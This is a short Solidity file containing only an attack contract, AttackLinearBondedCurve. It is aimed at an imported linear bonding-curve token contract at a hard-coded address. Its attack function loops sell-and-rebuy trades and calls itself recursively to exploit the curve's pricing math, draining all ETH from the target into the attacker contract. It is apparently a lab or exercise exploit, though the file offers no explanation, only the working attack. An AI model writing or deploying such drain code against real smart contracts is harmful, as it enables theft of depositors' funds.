// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./LinearBondedCurve.sol";

contract AttackLinearBondedCurve {
    address LBC = 0xd9145CCE52D386f254917e481eB44e9943F39138;
    LinearBondedCurve c = LinearBondedCurve(LBC);

    function deposit() external payable {}

    function buy() public payable {
        c.buy{value: address(this).balance}();
    }

    function attack() public {
        if (tokenToEth(getTokenBalance()) > address(LBC).balance) {
            c.sell(ethToToken(address(LBC).balance));
        } else {
            c.sell(getTokenBalance());
            do {
                c.buy{value: address(this).balance}();
                attack();
            } while (address(LBC).balance > 0 && gasleft() > 150000);
        }
    }

    function ethToToken(uint256 _amount) public view returns (uint256) {
        return (1e18 * _amount) / (1e18 + getTotalSupply());
    }

    function tokenToEth(uint256 _amount) public view returns (uint256) {
        return ((1e18 + getTotalSupply()) * _amount) / 1e18;
    }

    function getTotalSupply() public view returns (uint256) {
        return c.totalSupply();
    }

    function getTokenBalance() public view returns (uint256) {
        return c.balances(address(this));
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
